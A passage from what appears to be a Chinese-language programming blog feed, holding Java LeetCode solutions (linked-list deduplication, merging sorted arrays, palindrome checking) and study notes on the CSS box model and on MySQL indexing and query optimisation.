class="line">输出：[1,2,3]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li>链表中节点数目在范围 <code>[0, 300]</code> 内</li><li><code>-100 &lt;= Node.val &lt;= 100</code></li><li>题目数据保证链表已经按升序 <strong>排列</strong></li></ul><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class Solution9 &#123;</span><br><span class="line">    public ListNode deleteDuplicates(ListNode head) &#123;</span><br><span class="line">        ListNode cur = head;</span><br><span class="line">        while (cur != null &amp;&amp; cur.next != null)&#123;</span><br><span class="line">            if(cur.val == cur.next.val)&#123;</span><br><span class="line">                cur.next = cur.next.next;</span><br><span class="line">            &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ListNode &#123;</span><br><span class="line">    int val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(int x) &#123; val = x; &#125;</span><br><span class="line">&#125;//创建链表</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个小测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义链表节点类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(<span class="type">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解决方案类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span> &amp;&amp; cur.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur.val == cur.next.val) &#123;</span><br><span class="line">                cur.next = cur.next.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主方法，用于测试</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建测试链表：1 -&gt; 1 -&gt; 2 -&gt; 3 -&gt; 3</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">        head.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">        head.next.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">2</span>);</span><br><span class="line">        head.next.next.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">3</span>);</span><br><span class="line">        head.next.next.next.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Solution9</span> <span class="variable">solution</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Solution9</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">result</span> <span class="operator">=</span> solution.deleteDuplicates(head);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出处理后的链表</span></span><br><span class="line">        <span class="keyword">while</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.print(result.val + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            result = result.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 期望输出：1 2 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果和期望一致</p><p>🦅了</p><p>11.leetcode <a href="https://leetcode.cn/problems/merge-sorted-array/">合并两个有序数组</a></p><p>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。</p><p>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code> 中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p><p>**注意：**最终，合并后数组不应由函数返回，而是存储在数组 <code>nums1</code> 中。为了应对这种情况，<code>nums1</code> 的初始长度为 <code>m + n</code>，其中前 <code>m</code> 个元素表示应合并的元素，后 <code>n</code> 个元素为 <code>0</code> ，应忽略。<code>nums2</code> 的长度为 <code>n</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3</span><br><span class="line">输出：[1,2,2,3,5,6]</span><br><span class="line">解释：需要合并 [1,2,3] 和 [2,5,6] 。</span><br><span class="line">合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1], m = 1, nums2 = [], n = 0</span><br><span class="line">输出：[1]</span><br><span class="line">解释：需要合并 [1] 和 [] 。</span><br><span class="line">合并结果是 [1] 。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [0], m = 0, nums2 = [1], n = 1</span><br><span class="line">输出：[1]</span><br><span class="line">解释：需要合并的数组是 [] 和 [1] 。</span><br><span class="line">合并结果是 [1] 。</span><br><span class="line">注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>nums1.length == m + n</code></li><li><code>nums2.length == n</code></li><li><code>0 &lt;= m, n &lt;= 200</code></li><li><code>1 &lt;= m + n &lt;= 200</code></li><li><code>-109 &lt;= nums1[i], nums2[j] &lt;= 109</code></li></ul><p>题解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class Solution10 &#123;</span><br><span class="line">    public void merge(int[] nums1, int m, int[] nums2, int n) &#123;</span><br><span class="line">        int i = m - 1; // nums1 中最后一个有效元素的索引</span><br><span class="line">        int j = n - 1; // nums2 中最后一个有效元素的索引</span><br><span class="line">        int index = m + n - 1; // 合并后数组的最后一个位置的索引</span><br><span class="line"></span><br><span class="line">        // 从后向前合并两个数组</span><br><span class="line">        while (i &gt;= 0 &amp;&amp; j &gt;= 0) &#123;</span><br><span class="line">            if (nums1[i] &lt;= nums2[j]) &#123;</span><br><span class="line">                nums1[index--] = nums2[j--];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                nums1[index--] = nums1[i--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 如果 nums2 中还有剩余元素，继续填入 nums1 中</span><br><span class="line">        while (j &gt;= 0) &#123;</span><br><span class="line">            nums1[index--] = nums2[j--];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 如果 nums1 中有剩余元素，不需要额外处理，因为它们已经在正确的位置上</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="11-leetcode-验证回文串-双指针">11.leetcode <a href="https://leetcode.cn/problems/valid-palindrome/">验证回文串</a>(双指针)</h3><p>如果在将所有大写字符转换为小写字符、并移除所有非字母数字字符之后，短语正着读和反着读都一样。则可以认为该短语是一个 <strong>回文串</strong> 。</p><p>字母和数字都属于字母数字字符。</p><p>给你一个字符串 <code>s</code>，如果它是 <strong>回文串</strong> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;A man, a plan, a canal: Panama&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：&quot;amanaplanacanalpanama&quot; 是回文串。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;race a car&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：&quot;raceacar&quot; 不是回文串。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot; &quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：在移除非字母数字字符之后，s 是一个空字符串 &quot;&quot; 。</span><br><span class="line">由于空字符串正着反着读都一样，所以是回文串。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 2 * 105</code></li><li><code>s</code> 仅由可打印的 ASCII 字符组成</li></ul><p>题解：</p><p>判断回文一般都是用双指针算法。这题和其他题不同的是有多余空或者符号，我们只要去掉这些多余空格和符号就行，再进行判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Solution11 &#123;</span><br><span class="line">    public boolean isPalindrome(String s) &#123;</span><br><span class="line">        int l = 0, r = s.length() - 1;//前后项</span><br><span class="line"></span><br><span class="line">        while (l &lt; r) &#123;</span><br><span class="line">            // 跳过非字母和非数字字符</span><br><span class="line">            while (l &lt; r &amp;&amp; !Character.isLetterOrDigit(s.charAt(l))) &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">            while (l &lt; r &amp;&amp; !Character.isLetterOrDigit(s.charAt(r))) &#123;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 比较字符</span><br><span class="line">            if (l &lt; r) &#123;</span><br><span class="line">                if (Character.toLowerCase(s.charAt(l)) != Character.toLowerCase(s.charAt(r))) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                l++;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS BASIC2</title>
      <link href="/2024/07/25/css2/"/>
      <url>/2024/07/25/css2/</url>
      
        <content type="html"><![CDATA[<h1>CSS  BASIC2</h1><h2 id="layout布局">_layout布局</h2><h3 id="文档流">文档流</h3><p>网页是一个多层的结构，一层加一层，层层叠叠，通过css来设置每一层的样式，作为用户只能看到最顶上的一层</p><p>最底下的一层成为文档流，我们所创建的元素默认都是在文档流里进行排列，元素主要有两个状态，在文档流中和脱离文档流两个状态</p><p>文档流的特点：</p><ul><li>块元素在页面中独占一行，默认宽度是父元素的全部，会把父元素盛满，默认高度是被内容撑开，自上而下垂直排列</li><li>行内元素不会独占一行，只占自身的大小，自左向右水平排列。如何一行中不足以容纳，会换到第二行继续自左向右排列，行内元素的默认宽度和高度都是被内容撑开</li></ul><h3 id="盒子模型">盒子模型</h3><p>首先确定元素的形状和大小，css将所有元素都设置成了一个矩形的盒子</p><p>每一个盒子都由一下部分组成：</p><ul><li>内容区（content)</li><li>边块（border)</li><li>内边距（padding)</li><li>外边距（margin)</li></ul><p>内容区：元素中的所有子元素和内容文本都在内容区中排列</p><p>width和height设置高度和宽度</p><p>设置边块至少下面三个元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.box1&#123;border-width: 10px;</span><br><span class="line"></span><br><span class="line">​        border-color: red;</span><br><span class="line"></span><br><span class="line">​        border-style: solid;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>边块的大小会影响盒子的大小</p><h4 id="边框">边框</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.box1&#123;border-width: 10px;</span><br><span class="line"></span><br><span class="line">​        border-color: red;</span><br><span class="line"></span><br><span class="line">​        border-style: solid;</span><br><span class="line"></span><br><span class="line">​      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>border-width会有默认值，上下左右都是10个像素。写4个值的化，先上右下左的顺序来排列</p><p>写3个值，上 左右 下。写两个值是上下 左右</p><p>除了这个还右一组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">border-top: ;</span><br></pre></td></tr></table></figure><p>这些来设定边框</p><p>border-color用来指定颜色，规则和上面一样</p><p>如何省略，则自动使用color值</p><p>border-style:</p><ul><li>solid实线</li><li>dotted 点状虚线</li><li>dashed 虚线</li><li>double 双线</li></ul><p>四个边框和上面的规则一样</p><p>默认值为：none为没有</p><h4 id="内边距">内边距</h4><p>一共有四个方向的padding 分别是top/bottom/right/left</p><p>内边距的设置会影响到盒子的大小，背景颜色延申到内边距上</p><p><strong>盒子的大小是由内容区，内边距和边块的大小决定的</strong>这些是可见框，外边距是不可见的</p><p>padding：这个属性的规则和前面的属性是一致的</p><h4 id="外边距">外边距</h4><p>margin不会影响盒子的大小，但是会影响盒子的位置。一共有四个方向的外边距</p><p>元素默认情况下是自左向右的，往左往上会移动元素自己，右和下会移动其他元素</p><p><strong>除了正值，还可以设置负值。</strong></p><p>margin：这个属性的规则和前面的属性设定是一样的</p><p>会影响盒子实际的大小，可见框是不会影响的</p><h4 id="盒子的水平布局">盒子的水平布局</h4><p>水平方向的位置由以下几个属性共同决定</p><ul><li>margin-left</li><li>border-left</li><li>padding-left</li><li>width</li><li>padding-right</li><li>border-right</li><li>margin-right</li></ul><p>一个元素在父元素中水平的布局必须满足：</p><p><strong>上面的七个值的和，等与其父元素内容区的宽度</strong></p><p>以上等式必须满足，如果等式不成立，则成为过度约束，等式会自动调整</p><p>如果这七个值没有auto的值，那么会调整margin-right的值</p><p>有三个值可以设定为auto</p><ul><li>width</li><li>margin-left</li><li>margin-right</li></ul><p>更改的时候会调整auto的值来使等式成立</p><p>如果将width和一个margin设置为auto那么宽度会调整为最大</p><p>三个值都为auto那么宽度最大</p><p><strong>如果将两个外边距设置为auto那么两个外边距平分，宽度不变。使用这个特点来是元素居中</strong></p><h4 id="margin塌陷问题">margin塌陷问题</h4><p>给子元素的margin的值被父元素抢走</p><ul><li>给父元素加上一个padding</li><li>给父元素加上一个border</li><li>overflow：hiddenl;专门控制溢出的元素的控制</li></ul><h4 id="margin合并的问题">margin合并的问题</h4><p>margin的合并只是存在在上下兄弟之间</p><p>使用float属性float:left使用这个会混乱其他的元素，所以就直接写就行了，不需要考虑其他的了。</p><h3 id="处理内容的溢出">处理内容的溢出</h3><p>在容器上加属性，使用overflow属性</p><p>hidden隐藏 scrool滚动条 auto自动条 默认属性visable显示</p><p>还可以使用overflow-x和overflow-y两个属性只能一样的效果比较好</p><h3 id="隐藏元素的两种方式">隐藏元素的两种方式</h3><ul><li>display:none;这样就可以隐藏了这个是不占位置的</li><li>visibility：hidden;这个属性的隐藏是占据位置的</li></ul><h3 id="样式的继承">样式的继承</h3><p><strong>font-weight：bold字体加粗</strong></p><p><strong>font-family: 字体 修改字体的属性</strong></p><p>在f12开发者工具中国，亮的部分是能够继承的，不亮的部分是不能继承的</p><p>字体属性，文本属性（除了vertical-align）文字属性等是可以继承的</p><p>和盒子模型等和布局无关的属性是可以继承的，盒子属性等是不能继承的</p><h3 id="元素的默认样式">元素的默认样式</h3><ul><li>超链接：继承过来的优先级比较低，不如默认属性</li><li>h1标题也是用默认样式的</li><li>段落p</li><li>ul列表</li><li>body</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 索引</title>
      <link href="/2024/07/25/mysql8/"/>
      <url>/2024/07/25/mysql8/</url>
      
        <content type="html"><![CDATA[<h1>MySQL 索引</h1><h2 id="介绍">介绍</h2><p>是帮助mysql高效的获取数据的数据结构（有序的）来指向原始数据，可以在这些数据结构上实现高级查找算法。</p><p>没有索引：</p><p>是按照上下顺序来直接查找的，会匹配整张表—叫做全表扫描</p><p>二叉树演示，会根据指向找到这条记录。，有索引的情况下搜索效率比较高</p><p>优缺点：提高排序效率，提高检索效率</p><p>会占用磁盘空间，但降低了表更新的速度</p><h2 id="结构">结构</h2><p>mysql的索引是在引擎层实现的</p><p>b+tree索引最常见的都支持</p><p>hash索引精确匹配memory支持</p><p>r-tree索引空间位置myisam支持</p><p>full-text索引除了memory不支持其他都支持</p><p>b-tree多路平衡查找树</p><p>几阶b-tree就最多有几个节点，会有n+1个指针</p><h3 id="构建b-tree">构建b-tree</h3><p><strong>满了中间元素向上分裂</strong>每一个key都会对应</p><h3 id="构建b-tree-2">构建b+tree</h3><p>在b+树中所有的元素都会在叶子节点，叶子节点会形成一个单向链表，非叶子节点只会起到索引的作用</p><p>mysql的所有，会形成了一个带有顺序的指针b+tree</p><p>所有的数据都会在叶子节点，用来存储数据，存储在页中</p><h3 id="hash索引">hash索引</h3><p>先算出每一行的hash值，将键值换成新的hash值，映射到对应的槽位上，存储的hash表中</p><p>多个key所以映射到同一个槽位中，会出现hash碰撞，可以通过链表解决</p><p>只能用于= in不支持范围</p><p>无法排序</p><p>效率比较高，除非出现hash碰撞</p><p><strong>为什么innodb选择B+tree？</strong></p><ul><li><p>对于b+树对于二叉树的层级更少，搜索效率高</p></li><li><p>相对于b-ree无论是叶子节点还是非叶子节点，都会保存数据，会导致键值变少，指针变少，同样要保留大量数据，只能增加树的高度，导致性能降低</p></li><li><p>对于hash索引来说，可以范围索引和排序</p></li></ul><h2 id="索引的分类">索引的分类</h2><p>主键索引，对于主键的创建的索引，只能有一个，默认自动创建 primary</p><p>唯一索引，避免同一个表中的数据列的值重复，unique</p><p>常规索引 快速定位数据</p><p>全文索引 查找文本中的关键字，而不是索引中的值，关键词fulltext</p><p>还分为</p><p>聚集索引：数据存储和索引放在一个，必须有而且<strong>只能有一个</strong></p><p>二级索引，将数据和索引分开，叶子节点关联的是对应的主键</p><p>聚集索引：</p><ul><li>存在主键，主键索引就是聚集索引</li><li>不存在主键，将会引用第一个唯一索引作为聚集索引</li><li>没有主键，没有唯一索引，Innodb会自动生成一个rowid作为隐藏的聚集索引</li></ul><p>回表查询：先走二级索引找到对应的主键值，再到聚集索引中拿到这一行的行数据</p><p>思考：</p><p>innodb的b+tree高度是多少？</p><p>16*1171^h,高度为h</p><h2 id="索引的操作语法">索引的操作语法</h2><p>创建索引：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE [UNIQUE/FULLLTEXT] INDEX INDEX_NAME ON TABLE_NAME(INDEX_COL_NAME...);</span><br></pre></td></tr></table></figure><p>一个索引是可以关联多个字段的</p><p>查看索引：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show index from table_name;</span><br></pre></td></tr></table></figure><p>删除索引：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index index_name on table_name;</span><br></pre></td></tr></table></figure><p>索引名字格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idx_user_name;</span><br></pre></td></tr></table></figure><h1>sql性能优化</h1><h2 id="sql的执行频率">sql的执行频率</h2><p>看当前的数据库的增删改为主优化不用太好，查的频率高要进行优化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select global status like &#x27;com_______&#x27;;</span><br></pre></td></tr></table></figure><p>查看当前的执行频率</p><p>在这里面进行查看</p><h3 id="慢查询日志">慢查询日志</h3><p>查看超过指定时间（默认10s）的sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;long_query_time&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看状态</p><p>在/etc/my.cnf</p><p>设置其中的两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slow_query_log=1</span><br><span class="line">long_query_time=2</span><br></pre></td></tr></table></figure><p>这样就能开启了，超过两秒的就会被计入慢查询日志中</p><h3 id="profile">profile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show profiles;</span><br></pre></td></tr></table></figure><p>了解时间耗时情况</p><p>默认这个开关时关闭的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set profiling = 1;</span><br></pre></td></tr></table></figure><p>开启开关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show profile cup for query 16;</span><br></pre></td></tr></table></figure><p>cup的耗时情况</p><h3 id="explain">explain</h3><p>可以看到sql语句的执行情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explain +sql语句；</span><br></pre></td></tr></table></figure><ul><li>id:select查询的序列号，执行顺序从上到下，id不同，值越大越先执行。展示表的执行顺序</li><li>select_type：表示select的类型，simple(简单表，不用表连接和子查询) primmary（主查询，即外层的查询）</li></ul><p>union（uniion中的第二个或者后面的查询语句） subquery(select/where之后包含了子查询)等</p><ul><li>type：表示连接类型，性能好到差的null system const eq_ref ref range index all</li><li>possible_key：可能用到的索引</li><li>key：实际用到的索引</li><li>ken_len：索引中的长度</li><li>row：执行查询的行数，只是一个预估值</li><li>filerted:返回结果的行数站所要读取的行数的百分比，越大越好</li></ul><h2 id="索引的使用">索引的使用</h2><p>原则：</p><h3 id="最左前缀法则">最左前缀法则</h3><p>查询使用索引要从索引的最左列开始，不能跳过，跳过的话，后面的索引就会失效</p><p>必须包含最左边的一列，放在哪都行，必须要存在</p><h3 id="范围查询">范围查询</h3><p>联合索引中，出现范围查询(&lt;&gt;)范围查询右侧的索引列失效</p><p>使用大于等于或者小于等于就可以避免后面的索引失效</p><h3 id="索引列运算操作">索引列运算操作</h3><p>不用在索引列上进行运算操作，否则索引会失效</p><p><strong>不能不加单引号，否则索引也会失效</strong></p><h3 id="模糊查询">模糊查询</h3><p>尾部进行模糊匹配，索引不会失效。头部进行模糊匹配索引会失效</p><p>后面加%可以进行索引，前面加%索引就会失效。一定要规避这样的sql语句</p><h2 id="索引的使用原则">索引的使用原则</h2><h3 id="or的连接条件">or的连接条件</h3><p>or的两侧都有索引，索引才会成功，一侧没有索引，索引就会失效</p><h3 id="数据分布影响">数据分布影响</h3><p>使用索引比全表扫面还慢的话，就不要用索引了</p><h3 id="sql提示">sql提示</h3><p>优化数据库的手段</p><p>提示：</p><ul><li>use index 建议</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_user use index(idx_user_pro) <span class="keyword">where</span> profession <span class="operator">=</span> <span class="string">&#x27;ruangong&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><p>ignore index  忽略</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_user ignore index(idx_user_pro) <span class="keyword">where</span> profession <span class="operator">=</span> <span class="string">&#x27;ruangong&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>force index  强制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explain select * from tb_user force index(idx_user_pro) where profession = &#x27;ruangong&#x27;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="覆盖索引">覆盖索引</h3><p>尽量使用覆盖索引(查询使用了索引，并且需要返回的列，再改索引中全部都能找到)</p><p>查询的字段要在联合索引里面，否则就会出现查询使用了索引，但是还需要进行回表查询</p><h3 id="前缀索引">前缀索引</h3><p>当字段列表是字符串的时候，要引用的字符串很大，索引变得很大，浪费大量的io</p><p>只将字符串的一部分前缀建立索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_xxx <span class="keyword">on</span> tablle_name(<span class="keyword">column</span>(n));</span><br></pre></td></tr></table></figure><p>求取选择性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(distict email)/count(*) from table_name;</span><br></pre></td></tr></table></figure><p>选择性要大，而且前缀不要太多</p><p>建立索引：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> index idx_email_5 <span class="keyword">on</span> <span class="keyword">table</span>(email(<span class="number">5</span>));</span><br></pre></td></tr></table></figure><h3 id="单列索引和联合索引的选择">单列索引和联合索引的选择</h3><p>推荐使用联合索引，建立联合索引进行查询。</p><h2 